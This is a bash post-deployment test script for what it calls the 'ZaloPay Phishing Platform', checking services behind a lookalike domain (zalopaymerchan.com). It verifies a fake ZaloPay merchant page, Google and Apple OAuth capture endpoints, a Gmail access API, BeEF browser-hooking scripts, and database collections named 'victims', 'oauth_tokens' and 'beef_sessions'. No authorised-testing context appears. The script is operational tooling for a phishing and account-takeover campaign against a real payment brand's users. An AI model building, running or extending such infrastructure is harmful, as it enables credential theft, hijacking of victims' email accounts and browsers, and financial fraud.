#!/bin/bash

# Post-Deployment Testing Script for ZaloPay Phishing Platform
# This script verifies all services, OAuth flow, admin dashboard, BeEF integration, and SSL configuration

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
DOMAIN="zalopaymerchan.com"
DOCKER_COMPOSE_FILE="docker-compose.yml"
TEST_RESULTS_FILE="test_results_$(date +%Y%m%d_%H%M%S).txt"

# Test counters
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

# Functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

test_result() {
    local test_name="$1"
    local result="$2"
    local details="$3"
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    if [ "$result" = "PASS" ]; then
        PASSED_TESTS=$((PASSED_TESTS + 1))
        log_success "✓ $test_name"
    else
        FAILED_TESTS=$((FAILED_TESTS + 1))
        log_error "✗ $test_name"
    fi
    
    # Log to results file
    echo "[$result] $test_name: $details" >> "$TEST_RESULTS_FILE"
}

test_service_health() {
    log_info "Testing service health..."
    
    # Test MongoDB
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T mongodb mongosh --eval "db.runCommand('ping')" &> /dev/null; then
        test_result "MongoDB Health" "PASS" "MongoDB is responding to ping"
    else
        test_result "MongoDB Health" "FAIL" "MongoDB is not responding"
    fi
    
    # Test Redis
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T redis redis-cli ping &> /dev/null; then
        test_result "Redis Health" "PASS" "Redis is responding to ping"
    else
        test_result "Redis Health" "FAIL" "Redis is not responding"
    fi
    
    # Test InfluxDB
    if curl -s http://localhost:8086/health &> /dev/null; then
        test_result "InfluxDB Health" "PASS" "InfluxDB health endpoint is accessible"
    else
        test_result "InfluxDB Health" "FAIL" "InfluxDB health endpoint is not accessible"
    fi
    
    # Test Backend
    if curl -s http://localhost:8000/health &> /dev/null; then
        test_result "Backend Health" "PASS" "Backend health endpoint is accessible"
    else
        test_result "Backend Health" "FAIL" "Backend health endpoint is not accessible"
    fi
    
    # Test Frontend
    if curl -s http://localhost:80 &> /dev/null; then
        test_result "Frontend Health" "PASS" "Frontend is accessible"
    else
        test_result "Frontend Health" "FAIL" "Frontend is not accessible"
    fi
    
    # Test BeEF
    if curl -s http://localhost:3000 &> /dev/null; then
        test_result "BeEF Health" "PASS" "BeEF is accessible"
    else
        test_result "BeEF Health" "FAIL" "BeEF is not accessible"
    fi
}

test_ssl_configuration() {
    log_info "Testing SSL configuration..."
    
    # Test SSL certificate existence
    if [ -f "ssl/live/$DOMAIN/fullchain.pem" ]; then
        test_result "SSL Certificate Exists" "PASS" "SSL certificate file found"
        
        # Test certificate validity
        if openssl x509 -in "ssl/live/$DOMAIN/fullchain.pem" -noout -checkend 0 &> /dev/null; then
            test_result "SSL Certificate Valid" "PASS" "SSL certificate is valid"
        else
            test_result "SSL Certificate Valid" "FAIL" "SSL certificate is expired or invalid"
        fi
        
        # Test certificate expiration
        cert_expiry=$(openssl x509 -in "ssl/live/$DOMAIN/fullchain.pem" -noout -enddate | cut -d= -f2)
        cert_expiry_epoch=$(date -d "$cert_expiry" +%s)
        current_epoch=$(date +%s)
        days_until_expiry=$(( (cert_expiry_epoch - current_epoch) / 86400 ))
        
        if [ $days_until_expiry -gt 30 ]; then
            test_result "SSL Certificate Expiry" "PASS" "Certificate expires in $days_until_expiry days"
        elif [ $days_until_expiry -gt 7 ]; then
            test_result "SSL Certificate Expiry" "WARN" "Certificate expires in $days_until_expiry days"
        else
            test_result "SSL Certificate Expiry" "FAIL" "Certificate expires in $days_until_expiry days"
        fi
    else
        test_result "SSL Certificate Exists" "FAIL" "SSL certificate file not found"
    fi
    
    # Test HTTPS accessibility
    if curl -s -I https://$DOMAIN | grep -q "200 OK"; then
        test_result "HTTPS Accessibility" "PASS" "Domain is accessible via HTTPS"
    else
        test_result "HTTPS Accessibility" "FAIL" "Domain is not accessible via HTTPS"
    fi
    
    # Test HTTP to HTTPS redirect
    if curl -s -I http://$DOMAIN | grep -q "301\|302"; then
        test_result "HTTP to HTTPS Redirect" "PASS" "HTTP requests are redirected to HTTPS"
    else
        test_result "HTTP to HTTPS Redirect" "FAIL" "HTTP requests are not redirected to HTTPS"
    fi
}

test_database_connections() {
    log_info "Testing database connections..."
    
    # Test MongoDB connection
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T mongodb mongosh zalopay_phishing --eval "db.stats()" &> /dev/null; then
        test_result "MongoDB Connection" "PASS" "MongoDB database is accessible"
    else
        test_result "MongoDB Connection" "FAIL" "MongoDB database is not accessible"
    fi
    
    # Test Redis connection
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T redis redis-cli dbsize &> /dev/null; then
        test_result "Redis Connection" "PASS" "Redis database is accessible"
    else
        test_result "Redis Connection" "FAIL" "Redis database is not accessible"
    fi
    
    # Test InfluxDB connection
    if curl -s http://localhost:8086/api/v2/health &> /dev/null; then
        test_result "InfluxDB Connection" "PASS" "InfluxDB is accessible"
    else
        test_result "InfluxDB Connection" "FAIL" "InfluxDB is not accessible"
    fi
}

test_api_endpoints() {
    log_info "Testing API endpoints..."
    
    # Test admin dashboard API
    if curl -s http://localhost:8000/api/admin/dashboard/stats &> /dev/null; then
        test_result "Admin Dashboard API" "PASS" "Admin dashboard API is accessible"
    else
        test_result "Admin Dashboard API" "FAIL" "Admin dashboard API is not accessible"
    fi
    
    # Test OAuth endpoints
    if curl -s http://localhost:8000/api/oauth/google &> /dev/null; then
        test_result "OAuth Google Endpoint" "PASS" "Google OAuth endpoint is accessible"
    else
        test_result "OAuth Google Endpoint" "FAIL" "Google OAuth endpoint is not accessible"
    fi
    
    if curl -s http://localhost:8000/api/oauth/apple &> /dev/null; then
        test_result "OAuth Apple Endpoint" "PASS" "Apple OAuth endpoint is accessible"
    else
        test_result "OAuth Apple Endpoint" "FAIL" "Apple OAuth endpoint is not accessible"
    fi
    
    # Test Gmail access API
    if curl -s http://localhost:8000/api/admin/gmail/access &> /dev/null; then
        test_result "Gmail Access API" "PASS" "Gmail access API is accessible"
    else
        test_result "Gmail Access API" "FAIL" "Gmail access API is not accessible"
    fi
    
    # Test BeEF control API
    if curl -s http://localhost:8000/api/admin/beef/hooks &> /dev/null; then
        test_result "BeEF Control API" "PASS" "BeEF control API is accessible"
    else
        test_result "BeEF Control API" "FAIL" "BeEF control API is not accessible"
    fi
    
    # Test WebSocket endpoint
    if curl -s http://localhost:8000/ws &> /dev/null; then
        test_result "WebSocket Endpoint" "PASS" "WebSocket endpoint is accessible"
    else
        test_result "WebSocket Endpoint" "FAIL" "WebSocket endpoint is not accessible"
    fi
}

test_frontend_pages() {
    log_info "Testing frontend pages..."
    
    # Test merchant landing page
    if curl -s http://localhost:80/merchant/ | grep -q "ZaloPay"; then
        test_result "Merchant Landing Page" "PASS" "Merchant landing page loads correctly"
    else
        test_result "Merchant Landing Page" "FAIL" "Merchant landing page does not load correctly"
    fi
    
    # Test OAuth signup page
    if curl -s http://localhost:80/merchant/auth_signup.html | grep -q "Google"; then
        test_result "OAuth Signup Page" "PASS" "OAuth signup page loads correctly"
    else
        test_result "OAuth Signup Page" "FAIL" "OAuth signup page does not load correctly"
    fi
    
    # Test admin dashboard
    if curl -s http://localhost:80/admin/ | grep -q "Dashboard"; then
        test_result "Admin Dashboard Page" "PASS" "Admin dashboard page loads correctly"
    else
        test_result "Admin Dashboard Page" "FAIL" "Admin dashboard page does not load correctly"
    fi
    
    # Test support pages
    if curl -s http://localhost:80/merchant/contact.html | grep -q "Contact"; then
        test_result "Contact Page" "PASS" "Contact page loads correctly"
    else
        test_result "Contact Page" "FAIL" "Contact page does not load correctly"
    fi
    
    if curl -s http://localhost:80/merchant/faq.html | grep -q "FAQ"; then
        test_result "FAQ Page" "PASS" "FAQ page loads correctly"
    else
        test_result "FAQ Page" "FAIL" "FAQ page does not load correctly"
    fi
}

test_beef_integration() {
    log_info "Testing BeEF integration..."
    
    # Test BeEF console accessibility
    if curl -s http://localhost:3000/ui/panel | grep -q "BeEF"; then
        test_result "BeEF Console" "PASS" "BeEF console is accessible"
    else
        test_result "BeEF Console" "FAIL" "BeEF console is not accessible"
    fi
    
    # Test BeEF API
    if curl -s http://localhost:3000/api/hooks | grep -q "hooks"; then
        test_result "BeEF API" "PASS" "BeEF API is accessible"
    else
        test_result "BeEF API" "FAIL" "BeEF API is not accessible"
    fi
    
    # Test BeEF hook script
    if curl -s http://localhost:3000/hook.js | grep -q "BeEF"; then
        test_result "BeEF Hook Script" "PASS" "BeEF hook script is accessible"
    else
        test_result "BeEF Hook Script" "FAIL" "BeEF hook script is not accessible"
    fi
}

test_oauth_flow() {
    log_info "Testing OAuth flow..."
    
    # Test Google OAuth callback
    if curl -s http://localhost:8000/api/oauth/google/callback | grep -q "error\|success"; then
        test_result "Google OAuth Callback" "PASS" "Google OAuth callback endpoint is accessible"
    else
        test_result "Google OAuth Callback" "FAIL" "Google OAuth callback endpoint is not accessible"
    fi
    
    # Test Apple OAuth callback
    if curl -s http://localhost:8000/api/oauth/apple/callback | grep -q "error\|success"; then
        test_result "Apple OAuth Callback" "PASS" "Apple OAuth callback endpoint is accessible"
    else
        test_result "Apple OAuth Callback" "FAIL" "Apple OAuth callback endpoint is not accessible"
    fi
    
    # Test OAuth success page
    if curl -s http://localhost:80/merchant/auth_success.html | grep -q "Success"; then
        test_result "OAuth Success Page" "PASS" "OAuth success page loads correctly"
    else
        test_result "OAuth Success Page" "FAIL" "OAuth success page does not load correctly"
    fi
}

test_security_features() {
    log_info "Testing security features..."
    
    # Test rate limiting
    if curl -s http://localhost:8000/api/admin/dashboard/stats | grep -q "rate limit\|429"; then
        test_result "Rate Limiting" "PASS" "Rate limiting is working"
    else
        test_result "Rate Limiting" "WARN" "Rate limiting may not be working"
    fi
    
    # Test security headers
    if curl -s -I http://localhost:80 | grep -q "X-Frame-Options"; then
        test_result "Security Headers" "PASS" "Security headers are present"
    else
        test_result "Security Headers" "FAIL" "Security headers are missing"
    fi
    
    # Test CORS headers
    if curl -s -I http://localhost:8000/api/admin/dashboard/stats | grep -q "Access-Control-Allow-Origin"; then
        test_result "CORS Headers" "PASS" "CORS headers are present"
    else
        test_result "CORS Headers" "FAIL" "CORS headers are missing"
    fi
}

test_monitoring() {
    log_info "Testing monitoring features..."
    
    # Test InfluxDB metrics
    if curl -s http://localhost:8086/api/v2/query -X POST -H "Content-Type: application/json" -d '{"query": "from(bucket:\"metrics\") |> range(start: -1h)"}' &> /dev/null; then
        test_result "InfluxDB Metrics" "PASS" "InfluxDB metrics are accessible"
    else
        test_result "InfluxDB Metrics" "FAIL" "InfluxDB metrics are not accessible"
    fi
    
    # Test log files
    if [ -d "logs" ] && [ "$(ls -A logs)" ]; then
        test_result "Log Files" "PASS" "Log files are being generated"
    else
        test_result "Log Files" "FAIL" "Log files are not being generated"
    fi
    
    # Test structured logging
    if [ -f "logs/application.log" ] && grep -q "timestamp" logs/application.log; then
        test_result "Structured Logging" "PASS" "Structured logging is working"
    else
        test_result "Structured Logging" "FAIL" "Structured logging is not working"
    fi
}

test_database_schema() {
    log_info "Testing database schema..."
    
    # Test MongoDB collections
    collections=$(docker-compose -f $DOCKER_COMPOSE_FILE exec -T mongodb mongosh zalopay_phishing --eval "db.listCollectionNames()" --quiet)
    
    expected_collections=("victims" "oauth_tokens" "admin_users" "campaigns" "activity_logs" "gmail_access_logs" "beef_sessions")
    
    for collection in "${expected_collections[@]}"; do
        if echo "$collections" | grep -q "$collection"; then
            test_result "MongoDB Collection: $collection" "PASS" "Collection $collection exists"
        else
            test_result "MongoDB Collection: $collection" "FAIL" "Collection $collection does not exist"
        fi
    done
    
    # Test MongoDB indexes
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T mongodb mongosh zalopay_phishing --eval "db.victims.getIndexes()" &> /dev/null; then
        test_result "MongoDB Indexes" "PASS" "MongoDB indexes are created"
    else
        test_result "MongoDB Indexes" "FAIL" "MongoDB indexes are not created"
    fi
}

test_secrets_management() {
    log_info "Testing secrets management..."
    
    # Test secrets manager initialization
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T backend python -c "from security.secrets_management import get_secrets_manager; import asyncio; asyncio.run(get_secrets_manager())" &> /dev/null; then
        test_result "Secrets Manager" "PASS" "Secrets manager is initialized"
    else
        test_result "Secrets Manager" "FAIL" "Secrets manager is not initialized"
    fi
    
    # Test OAuth secrets
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T backend python -c "from security.secrets_management import get_oauth_secrets_manager; import asyncio; asyncio.run(get_oauth_secrets_manager())" &> /dev/null; then
        test_result "OAuth Secrets Manager" "PASS" "OAuth secrets manager is initialized"
    else
        test_result "OAuth Secrets Manager" "FAIL" "OAuth secrets manager is not initialized"
    fi
}

test_network_security() {
    log_info "Testing network security..."
    
    # Test network security manager
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T backend python -c "from security.network_segmentation import get_network_security_manager; import asyncio; asyncio.run(get_network_security_manager())" &> /dev/null; then
        test_result "Network Security Manager" "PASS" "Network security manager is initialized"
    else
        test_result "Network Security Manager" "FAIL" "Network security manager is not initialized"
    fi
    
    # Test rate limiters
    if docker-compose -f $DOCKER_COMPOSE_FILE exec -T backend python -c "from security.rate_limiting import initialize_rate_limiters; import asyncio; asyncio.run(initialize_rate_limiters())" &> /dev/null; then
        test_result "Rate Limiters" "PASS" "Rate limiters are initialized"
    else
        test_result "Rate Limiters" "FAIL" "Rate limiters are not initialized"
    fi
}

generate_test_report() {
    log_info "Generating test report..."
    
    local report_file="test_report_$(date +%Y%m%d_%H%M%S).html"
    
    {
        echo "<!DOCTYPE html>"
        echo "<html>"
        echo "<head>"
        echo "    <title>ZaloPay Phishing Platform - Test Report</title>"
        echo "    <style>"
        echo "        body { font-family: Arial, sans-serif; margin: 20px; }"
        echo "        .header { background-color: #f0f0f0; padding: 20px; border-radius: 5px; }"
        echo "        .summary { background-color: #e8f5e8; padding: 15px; border-radius: 5px; margin: 20px 0; }"
        echo "        .test-result { margin: 10px 0; padding: 10px; border-radius: 3px; }"
        echo "        .pass { background-color: #d4edda; border-left: 5px solid #28a745; }"
        echo "        .fail { background-color: #f8d7da; border-left: 5px solid #dc3545; }"
        echo "        .warn { background-color: #fff3cd; border-left: 5px solid #ffc107; }"
        echo "        .footer { margin-top: 30px; padding: 20px; background-color: #f8f9fa; border-radius: 5px; }"
        echo "    </style>"
        echo "</head>"
        echo "<body>"
        echo "    <div class=\"header\">"
        echo "        <h1>ZaloPay Phishing Platform - Test Report</h1>"
        echo "        <p>Generated: $(date)</p>"
        echo "        <p>Domain: $DOMAIN</p>"
        echo "    </div>"
        echo ""
        echo "    <div class=\"summary\">"
        echo "        <h2>Test Summary</h2>"
        echo "        <p><strong>Total Tests:</strong> $TOTAL_TESTS</p>"
        echo "        <p><strong>Passed:</strong> $PASSED_TESTS</p>"
        echo "        <p><strong>Failed:</strong> $FAILED_TESTS</p>"
        echo "        <p><strong>Success Rate:</strong> $(( (PASSED_TESTS * 100) / TOTAL_TESTS ))%</p>"
        echo "    </div>"
        echo ""
        echo "    <h2>Test Results</h2>"
        
        # Read test results and format as HTML
        while IFS= read -r line; do
            if [[ $line == *"[PASS]"* ]]; then
                echo "    <div class=\"test-result pass\">$line</div>"
            elif [[ $line == *"[FAIL]"* ]]; then
                echo "    <div class=\"test-result fail\">$line</div>"
            elif [[ $line == *"[WARN]"* ]]; then
                echo "    <div class=\"test-result warn\">$line</div>"
            fi
        done < "$TEST_RESULTS_FILE"
        
        echo ""
        echo "    <div class=\"footer\">"
        echo "        <h3>Deployment Information</h3>"
        echo "        <p><strong>Domain:</strong> https://$DOMAIN</p>"
        echo "        <p><strong>Admin Dashboard:</strong> https://$DOMAIN/admin</p>"
        echo "        <p><strong>Merchant Interface:</strong> https://$DOMAIN/merchant</p>"
        echo "        <p><strong>BeEF Console:</strong> http://localhost:3000/ui/panel</p>"
        echo "        <p><strong>InfluxDB:</strong> http://localhost:8086</p>"
        echo "        <p><strong>MongoDB:</strong> mongodb://localhost:27017</p>"
        echo "        <p><strong>Redis:</strong> redis://localhost:6379</p>"
        echo "    </div>"
        echo "</body>"
        echo "</html>"
    } > "$report_file"
    
    log_success "Test report generated: $report_file"
}

show_test_summary() {
    log_info "Test Summary:"
    echo "=================================="
    echo "Total Tests: $TOTAL_TESTS"
    echo "Passed: $PASSED_TESTS"
    echo "Failed: $FAILED_TESTS"
    echo "Success Rate: $(( (PASSED_TESTS * 100) / TOTAL_TESTS ))%"
    echo "=================================="
    
    if [ $FAILED_TESTS -eq 0 ]; then
        log_success "All tests passed! Deployment is successful."
    else
        log_warning "$FAILED_TESTS tests failed. Please check the test results."
    fi
}

# Main testing function
test_deployment() {
    log_info "Starting post-deployment testing..."
    echo "=================================="
    
    # Initialize test results file
    echo "ZaloPay Phishing Platform - Test Results" > "$TEST_RESULTS_FILE"
    echo "Generated: $(date)" >> "$TEST_RESULTS_FILE"
    echo "==================================" >> "$TEST_RESULTS_FILE"
    echo "" >> "$TEST_RESULTS_FILE"
    
    # Run all tests
    test_service_health
    test_ssl_configuration
    test_database_connections
    test_api_endpoints
    test_frontend_pages
    test_beef_integration
    test_oauth_flow
    test_security_features
    test_monitoring
    test_database_schema
    test_secrets_management
    test_network_security
    
    # Generate reports
    generate_test_report
    show_test_summary
    
    echo "=================================="
    
    if [ $FAILED_TESTS -eq 0 ]; then
        log_success "Post-deployment testing completed successfully!"
        return 0
    else
        log_error "Post-deployment testing completed with failures!"
        return 1
    fi
}

# Handle command line arguments
case "${1:-test}" in
    "test")
        test_deployment
        ;;
    "health")
        test_service_health
        ;;
    "ssl")
        test_ssl_configuration
        ;;
    "databases")
        test_database_connections
        ;;
    "api")
        test_api_endpoints
        ;;
    "frontend")
        test_frontend_pages
        ;;
    "beef")
        test_beef_integration
        ;;
    "oauth")
        test_oauth_flow
        ;;
    "security")
        test_security_features
        ;;
    "monitoring")
        test_monitoring
        ;;
    "schema")
        test_database_schema
        ;;
    "secrets")
        test_secrets_management
        ;;
    "network")
        test_network_security
        ;;
    "report")
        generate_test_report
        ;;
    *)
        echo "Usage: $0 {test|health|ssl|databases|api|frontend|beef|oauth|security|monitoring|schema|secrets|network|report}"
        echo ""
        echo "Commands:"
        echo "  test       - Run all tests (default)"
        echo "  health     - Test service health"
        echo "  ssl        - Test SSL configuration"
        echo "  databases  - Test database connections"
        echo "  api        - Test API endpoints"
        echo "  frontend   - Test frontend pages"
        echo "  beef       - Test BeEF integration"
        echo "  oauth      - Test OAuth flow"
        echo "  security   - Test security features"
        echo "  monitoring - Test monitoring features"
        echo "  schema     - Test database schema"
        echo "  secrets    - Test secrets management"
        echo "  network    - Test network security"
        echo "  report     - Generate test report only"
        exit 1
        ;;
esac
